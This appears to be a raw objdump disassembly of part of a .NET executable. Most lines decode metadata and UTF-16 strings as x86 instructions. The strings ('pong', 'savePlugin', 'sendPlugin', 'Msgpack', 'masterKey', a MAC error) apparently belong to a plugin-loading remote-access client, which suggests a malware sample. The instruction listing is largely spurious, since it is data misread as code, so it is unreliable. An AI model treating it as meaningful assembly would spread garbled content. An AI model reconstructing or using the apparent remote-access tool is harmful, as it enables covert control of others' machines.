  40bb68:	00 41 00             	add    %al,0x0(%ecx)
  40bb6b:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb71:	00 13                	add    %dl,(%ebx)
  40bb73:	53                   	push   %ebx
  40bb74:	00 6f 00             	add    %ch,0x0(%edi)
  40bb77:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb7c:	00 61 00             	add    %ah,0x0(%ecx)
  40bb7f:	72 00                	jb     0x40bb81
  40bb81:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bb86:	09 70 00             	or     %esi,0x0(%eax)
  40bb89:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb8a:	00 6e 00             	add    %ch,0x0(%esi)
  40bb8d:	67 00 00             	add    %al,(%bx,%si)
  40bb90:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bb95:	75 00                	jne    0x40bb97
  40bb97:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb9b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb9c:	00 00                	add    %al,(%eax)
  40bb9e:	15 73 00 61 00       	adc    $0x610073,%eax
  40bba3:	76 00                	jbe    0x40bba5
  40bba5:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bba9:	6c                   	insb   (%dx),%es:(%edi)
  40bbaa:	00 75 00             	add    %dh,0x0(%ebp)
  40bbad:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbb1:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbb2:	00 00                	add    %al,(%eax)
  40bbb4:	07                   	pop    %es
  40bbb5:	44                   	inc    %esp
  40bbb6:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbba:	00 00                	add    %al,(%eax)
  40bbbc:	15 73 00 65 00       	adc    $0x650073,%eax
  40bbc1:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbc2:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bbc6:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbca:	00 67 00             	add    %ah,0x0(%edi)
  40bbcd:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bbd3:	48                   	dec    %eax
  40bbd4:	00 61 00             	add    %ah,0x0(%ecx)
  40bbd7:	73 00                	jae    0x40bbd9
  40bbd9:	68 00 65 00 73       	push   $0x73006500
  40bbde:	00 00                	add    %al,(%eax)
  40bbe0:	09 48 00             	or     %ecx,0x0(%eax)
  40bbe3:	61                   	popa
  40bbe4:	00 73 00             	add    %dh,0x0(%ebx)
  40bbe7:	68 00 00 1b 50       	push   $0x501b0000
  40bbec:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbf0:	00 67 00             	add    %ah,0x0(%edi)
  40bbf3:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bbf9:	50                   	push   %eax
  40bbfa:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbfe:	00 67 00             	add    %ah,0x0(%edi)
  40bc01:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc07:	52                   	push   %edx
  40bc08:	00 75 00             	add    %dh,0x0(%ebp)
  40bc0b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc0c:	00 00                	add    %al,(%eax)
  40bc0e:	0f 4d 00             	cmovge (%eax),%eax
  40bc11:	73 00                	jae    0x40bc13
  40bc13:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc17:	61                   	popa
  40bc18:	00 63 00             	add    %ah,0x0(%ebx)
  40bc1b:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc1e:	11 52 00             	adc    %edx,0x0(%edx)
  40bc21:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc25:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc29:	76 00                	jbe    0x40bc2b
  40bc2b:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc30:	0b 45 00             	or     0x0(%ebp),%eax
  40bc33:	72 00                	jb     0x40bc35
  40bc35:	72 00                	jb     0x40bc37
  40bc37:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc38:	00 72 00             	add    %dh,0x0(%edx)
  40bc3b:	00 47 6d             	add    %al,0x6d(%edi)
  40bc3e:	00 61 00             	add    %ah,0x0(%ecx)
  40bc41:	73 00                	jae    0x40bc43
  40bc43:	74 00                	je     0x40bc45
  40bc45:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc49:	4b                   	dec    %ebx
  40bc4a:	00 65 00             	add    %ah,0x0(%ebp)
  40bc4d:	79 00                	jns    0x40bc4f
  40bc4f:	20 00                	and    %al,(%eax)
  40bc51:	63 00                	arpl   %eax,(%eax)
  40bc53:	61                   	popa
  40bc54:	00 6e 00             	add    %ch,0x0(%esi)
  40bc57:	20 00                	and    %al,(%eax)
  40bc59:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc5a:	00 6f 00             	add    %ch,0x0(%edi)
  40bc5d:	74 00                	je     0x40bc5f
  40bc5f:	20 00                	and    %al,(%eax)
  40bc61:	62 00                	bound  %eax,(%eax)
  40bc63:	65 00 20             	add    %ah,%gs:(%eax)
  40bc66:	00 6e 00             	add    %ch,0x0(%esi)
  40bc69:	75 00                	jne    0x40bc6b
  40bc6b:	6c                   	insb   (%dx),%es:(%edi)
  40bc6c:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc70:	00 6f 00             	add    %ch,0x0(%edi)
  40bc73:	72 00                	jb     0x40bc75
  40bc75:	20 00                	and    %al,(%eax)
  40bc77:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc7b:	70 00                	jo     0x40bc7d
  40bc7d:	74 00                	je     0x40bc7f
  40bc7f:	79 00                	jns    0x40bc81
  40bc81:	2e 00 00             	add    %al,%cs:(%eax)
  40bc84:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bc89:	70 00                	jo     0x40bc8b
  40bc8b:	75 00                	jne    0x40bc8d
  40bc8d:	74 00                	je     0x40bc8f
  40bc8f:	20 00                	and    %al,(%eax)
  40bc91:	63 00                	arpl   %eax,(%eax)
  40bc93:	61                   	popa
  40bc94:	00 6e 00             	add    %ch,0x0(%esi)
  40bc97:	20 00                	and    %al,(%eax)
  40bc99:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc9a:	00 6f 00             	add    %ch,0x0(%edi)
  40bc9d:	74 00                	je     0x40bc9f
  40bc9f:	20 00                	and    %al,(%eax)
  40bca1:	62 00                	bound  %eax,(%eax)
  40bca3:	65 00 20             	add    %ah,%gs:(%eax)
  40bca6:	00 6e 00             	add    %ch,0x0(%esi)
  40bca9:	75 00                	jne    0x40bcab
  40bcab:	6c                   	insb   (%dx),%es:(%edi)
  40bcac:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bcb0:	00 00                	add    %al,(%eax)
  40bcb2:	55                   	push   %ebp
  40bcb3:	49                   	dec    %ecx
  40bcb4:	00 6e 00             	add    %ch,0x0(%esi)
  40bcb7:	76 00                	jbe    0x40bcb9
  40bcb9:	61                   	popa
  40bcba:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bcbe:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bcc2:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcc5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bcc9:	73 00                	jae    0x40bccb
  40bccb:	61                   	popa
  40bccc:	00 67 00             	add    %ah,0x0(%edi)
  40bccf:	65 00 20             	add    %ah,%gs:(%eax)
  40bcd2:	00 61 00             	add    %ah,0x0(%ecx)
  40bcd5:	75 00                	jne    0x40bcd7
  40bcd7:	74 00                	je     0x40bcd9
  40bcd9:	68 00 65 00 6e       	push   $0x6e006500
  40bcde:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bce2:	00 63 00             	add    %ah,0x0(%ebx)
  40bce5:	61                   	popa
  40bce6:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcea:	00 6f 00             	add    %ch,0x0(%edi)
  40bced:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcee:	00 20                	add    %ah,(%eax)
  40bcf0:	00 63 00             	add    %ah,0x0(%ebx)
  40bcf3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcf4:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bcf8:	00 20                	add    %ah,(%eax)
  40bcfa:	00 28                	add    %ch,(%eax)
  40bcfc:	00 4d 00             	add    %cl,0x0(%ebp)
  40bcff:	41                   	inc    %ecx
  40bd00:	00 43 00             	add    %al,0x0(%ebx)
  40bd03:	29 00                	sub    %eax,(%eax)
  40bd05:	2e 00 00             	add    %al,%cs:(%eax)
  40bd08:	05 58 00 32 00       	add    $0x320058,%eax
  40bd0d:	00 0f                	add    %cl,(%edi)
  40bd0f:	7b 00                	jnp    0x40bd11
  40bd11:	30 00                	xor    %al,(%eax)
  40bd13:	3a 00                	cmp    (%eax),%al
  40bd15:	44                   	inc    %esp
  40bd16:	00 33                	add    %dh,(%ebx)
  40bd18:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd1b:	20 00                	and    %al,(%eax)
  40bd1d:	00 0f                	add    %cl,(%edi)
  40bd1f:	7b 00                	jnp    0x40bd21
  40bd21:	30 00                	xor    %al,(%eax)
  40bd23:	3a 00                	cmp    (%eax),%al
  40bd25:	58                   	pop    %eax
  40bd26:	00 32                	add    %dh,(%edx)
  40bd28:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd2b:	20 00                	and    %al,(%eax)
  40bd2d:	00 2b                	add    %ch,(%ebx)
  40bd2f:	28 00                	sub    %al,(%eax)
  40bd31:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd32:	00 65 00             	add    %ah,0x0(%ebp)
  40bd35:	76 00                	jbe    0x40bd37
  40bd37:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd3b:	20 00                	and    %al,(%eax)
  40bd3d:	75 00                	jne    0x40bd3f
  40bd3f:	73 00                	jae    0x40bd41
  40bd41:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd46:	00 20                	add    %ah,(%eax)
  40bd48:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd4c:	00 70 00             	add    %dh,0x0(%eax)
  40bd4f:	65 00 20             	add    %ah,%gs:(%eax)
  40bd52:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd55:	63 00                	arpl   %eax,(%eax)
  40bd57:	31 00                	xor    %eax,(%eax)
  40bd59:	00 45 28             	add    %al,0x28(%ebp)
  40bd5c:	00 65 00             	add    %ah,0x0(%ebp)
  40bd5f:	78 00                	js     0x40bd61
  40bd61:	74 00                	je     0x40bd63
  40bd63:	38 00                	cmp    %al,(%eax)
  40bd65:	2c 00                	sub    $0x0,%al
  40bd67:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd6b:	74 00                	je     0x40bd6d
  40bd6d:	31 00                	xor    %eax,(%eax)
  40bd6f:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd73:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd77:	33 00                	xor    (%eax),%eax
  40bd79:	32 00                	xor    (%eax),%al
  40bd7b:	29 00                	sub    %eax,(%eax)
  40bd7d:	20 00                	and    %al,(%eax)
  40bd7f:	74 00                	je     0x40bd81
  40bd81:	79 00                	jns    0x40bd83
  40bd83:	70 00                	jo     0x40bd85
  40bd85:	65 00 20             	add    %ah,%gs:(%eax)
  40bd88:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd8b:	63 00                	arpl   %eax,(%eax)
  40bd8d:	37                   	aaa
  40bd8e:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bd91:	24 00                	and    $0x0,%al
  40bd93:	63 00                	arpl   %eax,(%eax)
  40bd95:	38 00                	cmp    %al,(%eax)
  40bd97:	2c 00                	sub    $0x0,%al
  40bd99:	24 00                	and    $0x0,%al
  40bd9b:	63 00                	arpl   %eax,(%eax)
  40bd9d:	39 00                	cmp    %eax,(%eax)
  40bd9f:	00 ad 81 9c a1 a7    	add    %ch,-0x585e637f(%ebp)
  40bda5:	dc 42 49             	faddl  0x49(%edx)
  40bda8:	ad                   	lods   %ds:(%esi),%eax
  40bda9:	7b c0                	jnp    0x40bd6b
  40bdab:	d7                   	xlat   %ds:(%ebx)
  40bdac:	3f                   	aas
  40bdad:	66 74 31             	data16 je 0x40bde1
  40bdb0:	00 08                	add    %cl,(%eax)
  40bdb2:	b7 7a                	mov    $0x7a,%bh
  40bdb4:	5c                   	pop    %esp
  40bdb5:	56                   	push   %esi
  40bdb6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bdb9:	89 03                	mov    %eax,(%ebx)
  40bdbb:	00 00                	add    %al,(%eax)
  40bdbd:	01 03                	add    %eax,(%ebx)
  40bdbf:	20 00                	and    %al,(%eax)
  40bdc1:	01 02                	add    %eax,(%edx)
  40bdc3:	06                   	push   %es
  40bdc4:	0e                   	push   %cs
  40bdc5:	03 06                	add    (%esi),%eax
  40bdc7:	12 09                	adc    (%ecx),%cl
  40bdc9:	03 06                	add    (%esi),%eax
  40bdcb:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bdcf:	00 02                	add    %al,(%edx)
  40bdd1:	03 06                	add    (%esi),%eax
  40bdd3:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bdd9:	03 06                	add    (%esi),%eax
  40bddb:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bde0:	03 06                	add    (%esi),%eax
  40bde2:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40bde8:	06                   	push   %es
  40bde9:	1c 02                	sbb    $0x2,%al
  40bdeb:	06                   	push   %es
  40bdec:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdef:	00 12                	add    %dl,(%edx)
  40bdf1:	0d 05 00 01 01       	or     $0x1010005,%eax
  40bdf6:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40bdfc:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be02:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be05:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be0b:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be11:	0a 04 00             	or     (%eax,%eax,1),%al
  40be14:	01 01                	add    %eax,(%ecx)
  40be16:	0a 04 00             	or     (%eax,%eax,1),%al
  40be19:	00 12                	add    %dl,(%edx)
  40be1b:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be20:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be26:	02 03                	add    (%ebx),%al
  40be28:	00 00                	add    %al,(%eax)
  40be2a:	1c 03                	sbb    $0x3,%al
  40be2c:	00 00                	add    %al,(%eax)
  40be2e:	08 04 00             	or     %al,(%eax,%eax,1)
  40be31:	01 01                	add    %eax,(%ecx)
  40be33:	08 04 00             	or     %al,(%eax,%eax,1)
  40be36:	01 02                	add    %eax,(%edx)
  40be38:	0e                   	push   %cs
  40be39:	0a 00                	or     (%eax),%al
  40be3b:	04 02                	add    $0x2,%al
  40be3d:	1c 12                	sbb    $0x12,%al
  40be3f:	19 12                	sbb    %edx,(%edx)
  40be41:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be46:	01 01                	add    %eax,(%ecx)
  40be48:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be4e:	1c 04                	sbb    $0x4,%al
  40be50:	08 00                	or     %al,(%eax)
  40be52:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be58:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be5b:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be61:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be64:	00 12                	add    %dl,(%edx)
  40be66:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be6b:	03 08                	add    (%eax),%ecx
  40be6d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be70:	08 00                	or     %al,(%eax)
  40be72:	08 03                	or     %al,(%ebx)
  40be74:	00 00                	add    %al,(%eax)
  40be76:	0e                   	push   %cs
  40be77:	04 00                	add    $0x0,%al
  40be79:	01 0e                	add    %ecx,(%esi)
  40be7b:	0e                   	push   %cs
  40be7c:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be82:	d5 0a                	aad    $0xa
  40be84:	3a 06                	cmp    (%esi),%al
  40be86:	00 01                	add    %al,(%ecx)
  40be88:	12 29                	adc    (%ecx),%ch
  40be8a:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40be90:	03 00                	add    (%eax),%eax
  40be92:	00 18                	add    %bl,(%eax)
  40be94:	07                   	pop    %es
  40be95:	00 03                	add    %al,(%ebx)
  40be97:	08 18                	or     %bl,(%eax)
  40be99:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40be9f:	18 0e                	sbb    %cl,(%esi)
  40bea1:	06                   	push   %es
  40bea2:	00 02                	add    %al,(%edx)
  40bea4:	02 18                	add    (%eax),%bl
  40bea6:	10 02                	adc    %al,(%edx)
  40bea8:	06                   	push   %es
  40bea9:	00 01                	add    %al,(%ecx)
  40beab:	11 30                	adc    %esi,(%eax)
  40bead:	11 30                	adc    %esi,(%eax)
  40beaf:	06                   	push   %es
  40beb0:	00 03                	add    %al,(%ebx)
  40beb2:	01 09                	add    %ecx,(%ecx)
  40beb4:	09 09                	or     %ecx,(%ecx)
  40beb6:	02 06                	add    (%esi),%al
  40beb8:	09 03                	or     %eax,(%ebx)
  40beba:	06                   	push   %es
  40bebb:	11 30                	adc    %esi,(%eax)
  40bebd:	04 00                	add    $0x0,%al
  40bebf:	00 00                	add    %al,(%eax)
  40bec1:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bec5:	00 00                	add    %al,(%eax)
  40bec7:	04 01                	add    $0x1,%al
  40bec9:	00 00                	add    %al,(%eax)
  40becb:	00 06                	add    %al,(%esi)
  40becd:	00 02                	add    %al,(%edx)
  40becf:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bed2:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bed7:	0e                   	push   %cs
  40bed8:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bedd:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40bee2:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bee7:	60                   	pusha
  40bee8:	05 00 01 01 12       	add    $0x12010100,%eax
  40beed:	60                   	pusha
  40beee:	04 00                	add    $0x0,%al
  40bef0:	01 01                	add    %eax,(%ecx)
  40bef2:	0e                   	push   %cs
  40bef3:	18 06                	sbb    %al,(%esi)
  40bef5:	15 12 45 01 15       	adc    $0x15014512,%eax
  40befa:	12 49 0a             	adc    0xa(%ecx),%cl
  40befd:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf00:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf06:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf0b:	0e                   	push   %cs
  40bf0c:	04 20                	add    $0x20,%al
  40bf0e:	00 00                	add    %al,(%eax)
  40bf10:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf13:	00 00                	add    %al,(%eax)
  40bf15:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf18:	00 00                	add    %al,(%eax)
  40bf1a:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf1d:	01 01                	add    %eax,(%ecx)
  40bf1f:	0e                   	push   %cs
  40bf20:	04 20                	add    $0x20,%al
  40bf22:	01 0e                	add    %ecx,(%esi)
  40bf24:	0e                   	push   %cs
  40bf25:	06                   	push   %es
  40bf26:	20 01                	and    %al,(%ecx)
  40bf28:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf2d:	20 02                	and    %al,(%edx)
  40bf2f:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf35:	00 01                	add    %al,(%ecx)
  40bf37:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf3c:	06                   	push   %es
  40bf3d:	11 50 03             	adc    %edx,0x3(%eax)
  40bf40:	06                   	push   %es
  40bf41:	12 55 05             	adc    0x5(%ebp),%dl
  40bf44:	00 01                	add    %al,(%ecx)
  40bf46:	0e                   	push   %cs
  40bf47:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf4c:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf51:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf57:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf5d:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf63:	01 01                	add    %eax,(%ecx)
  40bf65:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf6a:	60                   	pusha
  40bf6b:	03 20                	add    (%eax),%esp
  40bf6d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf70:	20 00                	and    %al,(%eax)
  40bf72:	02 03                	add    (%ebx),%al
  40bf74:	28 00                	sub    %al,(%eax)
  40bf76:	1c 03                	sbb    $0x3,%al
  40bf78:	06                   	push   %es
  40bf79:	12 60 0b             	adc    0xb(%eax),%ah
  40bf7c:	20 02                	and    %al,(%edx)
  40bf7e:	01 12                	add    %edx,(%edx)
  40bf80:	60                   	pusha
  40bf81:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf86:	60                   	pusha
  40bf87:	04 20                	add    $0x20,%al
  40bf89:	00 12                	add    %dl,(%edx)
  40bf8b:	60                   	pusha
  40bf8c:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf91:	0e                   	push   %cs
  40bf92:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf97:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bf9d:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bfa2:	60                   	pusha
  40bfa3:	08 03                	or     %al,(%ebx)
  40bfa5:	20 00                	and    %al,(%eax)
  40bfa7:	08 05 28 01 12 60    	or     %al,0x60120128
  40bfad:	08 03                	or     %al,(%ebx)
  40bfaf:	28 00                	sub    %al,(%eax)
  40bfb1:	08 03                	or     %al,(%ebx)
  40bfb3:	06                   	push   %es
  40bfb4:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bfb8:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bfbc:	01 08                	add    %ecx,(%eax)
  40bfbe:	0e                   	push   %cs
  40bfbf:	05 20 01 01 12       	add    $0x12010120,%eax
  40bfc4:	61                   	popa
  40bfc5:	04 20                	add    $0x20,%al
  40bfc7:	01 01                	add    %eax,(%ecx)
  40bfc9:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bfcc:	01 01                	add    %eax,(%ecx)
  40bfce:	0b 03                	or     (%ebx),%eax
  40bfd0:	20 00                	and    %al,(%eax)
  40bfd2:	0b 03                	or     (%ebx),%eax
  40bfd4:	20 00                	and    %al,(%eax)
  40bfd6:	0a 03                	or     (%ebx),%al
  40bfd8:	20 00                	and    %al,(%eax)
  40bfda:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bfdf:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40bfe4:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40bfe9:	01 0e                	add    %ecx,(%esi)
  40bfeb:	0e                   	push   %cs
  40bfec:	05 20 02 01 0e       	add    $0xe010220,%eax
  40bff1:	08 04 20             	or     %al,(%eax,%eiz,1)
  40bff4:	01 02                	add    %eax,(%edx)
  40bff6:	0e                   	push   %cs
  40bff7:	03 20                	add    (%eax),%esp
  40bff9:	00 0e                	add    %cl,(%esi)
  40bffb:	04 20                	add    $0x20,%al
  40bffd:	01 01                	add    %eax,(%ecx)
  40bfff:	02 04 20             	add    (%eax,%eiz,1),%al
  40c002:	01 01                	add    %eax,(%ecx)
  40c004:	0c 04                	or     $0x4,%al
  40c006:	20 01                	and    %al,(%ecx)
  40c008:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c00e:	5c                   	pop    %esp
  40c00f:	04 20                	add    $0x20,%al
  40c011:	00 11                	add    %dl,(%ecx)
  40c013:	64 04 20             	fs add $0x20,%al
  40c016:	00 12                	add    %dl,(%edx)
  40c018:	59                   	pop    %ecx
  40c019:	03 28                	add    (%eax),%ebp
  40c01b:	00 0e                	add    %cl,(%esi)
  40c01d:	03 28                	add    (%eax),%ebp
  40c01f:	00 0a                	add    %cl,(%edx)
  40c021:	03 28                	add    (%eax),%ebp
  40c023:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c029:	5c                   	pop    %esp
  40c02a:	04 28                	add    $0x28,%al
  40c02c:	00 11                	add    %dl,(%ecx)
  40c02e:	64 04 00             	fs add $0x0,%al
  40c031:	00 00                	add    %al,(%eax)
  40c033:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c036:	00 00                	add    %al,(%eax)
  40c038:	00 04 04             	add    %al,(%esp,%eax,1)
  40c03b:	00 00                	add    %al,(%eax)
  40c03d:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c044:	06                   	push   %es
  40c045:	00 00                	add    %al,(%eax)
  40c047:	00 04 07             	add    %al,(%edi,%eax,1)
  40c04a:	00 00                	add    %al,(%eax)
  40c04c:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c04f:	00 00                	add    %al,(%eax)
  40c051:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c054:	00 00                	add    %al,(%eax)
  40c056:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c059:	00 00                	add    %al,(%eax)
  40c05b:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c05e:	00 00                	add    %al,(%eax)
  40c060:	00 06                	add    %al,(%esi)
  40c062:	00 02                	add    %al,(%edx)
  40c064:	0e                   	push   %cs
  40c065:	12 61 08             	adc    0x8(%ecx),%ah
  40c068:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c06d:	61                   	popa
  40c06e:	06                   	push   %es
  40c06f:	00 02                	add    %al,(%edx)
  40c071:	0e                   	push   %cs
  40c072:	05 12 61 05 00       	add    $0x56112,%eax
  40c077:	01 01                	add    %eax,(%ecx)
  40c079:	12 61 06             	adc    0x6(%ecx),%ah
  40c07c:	00 02                	add    %al,(%edx)
  40c07e:	01 12                	add    %edx,(%edx)
  40c080:	61                   	popa
  40c081:	0e                   	push   %cs
  40c082:	07                   	pop    %es
  40c083:	00 02                	add    %al,(%edx)
  40c085:	01 12                	add    %edx,(%edx)
  40c087:	61                   	popa
  40c088:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c08d:	01 12                	add    %edx,(%edx)
  40c08f:	61                   	popa
  40c090:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c095:	12 61 0c             	adc    0xc(%ecx),%ah
  40c098:	06                   	push   %es
  40c099:	00 02                	add    %al,(%edx)
  40c09b:	01 12                	add    %edx,(%edx)
  40c09d:	61                   	popa
  40c09e:	02 06                	add    (%esi),%al
  40c0a0:	00 02                	add    %al,(%edx)
  40c0a2:	01 12                	add    %edx,(%edx)
  40c0a4:	61                   	popa
  40c0a5:	0b 06                	or     (%esi),%eax
  40c0a7:	00 02                	add    %al,(%edx)
  40c0a9:	01 12                	add    %edx,(%edx)
  40c0ab:	61                   	popa
  40c0ac:	0a 03                	or     (%ebx),%al
  40c0ae:	06                   	push   %es
  40c0af:	11 78 04             	adc    %edi,0x4(%eax)
  40c0b2:	20 01                	and    %al,(%ecx)
  40c0b4:	01 08                	add    %ecx,(%eax)
  40c0b6:	08 01                	or     %al,(%ecx)
  40c0b8:	00 08                	add    %cl,(%eax)
  40c0ba:	00 00                	add    %al,(%eax)
  40c0bc:	00 00                	add    %al,(%eax)
  40c0be:	00 1e                	add    %bl,(%esi)
  40c0c0:	01 00                	add    %eax,(%eax)
  40c0c2:	01 00                	add    %eax,(%eax)
  40c0c4:	54                   	push   %esp
  40c0c5:	02 16                	add    (%esi),%dl
  40c0c7:	57                   	push   %edi
  40c0c8:	72 61                	jb     0x40c12b
  40c0ca:	70 4e                	jo     0x40c11a
  40c0cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0cd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0ce:	45                   	inc    %ebp
  40c0cf:	78 63                	js     0x40c134
  40c0d1:	65 70 74             	gs jo  0x40c148
  40c0d4:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c0db:	77 73                	ja     0x40c150
  40c0dd:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c0e3:	71 08                	jno    0x40c0ed
  40c0e5:	01 00                	add    %eax,(%eax)
  40c0e7:	02 00                	add    (%eax),%al
  40c0e9:	00 00                	add    %al,(%eax)
  40c0eb:	00 00                	add    %al,(%eax)
  40c0ed:	05 01 00 00 00       	add    $0x1,%eax
  40c0f2:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c0f5:	00 07                	add    %al,(%edi)
  40c0f7:	31 2e                	xor    %ebp,(%esi)
  40c0f9:	30 2e                	xor    %ch,(%esi)
  40c0fb:	30 2e                	xor    %ch,(%esi)
  40c0fd:	30 00                	xor    %al,(%eax)
  40c0ff:	00 65 01             	add    %ah,0x1(%ebp)
  40c102:	00 29                	add    %ch,(%ecx)
  40c104:	2e 4e                	cs dec %esi
  40c106:	45                   	inc    %ebp
  40c107:	54                   	push   %esp
  40c108:	46                   	inc    %esi
  40c109:	72 61                	jb     0x40c16c
  40c10b:	6d                   	insl   (%dx),%es:(%edi)
  40c10c:	65 77 6f             	gs ja  0x40c17e
  40c10f:	72 6b                	jb     0x40c17c
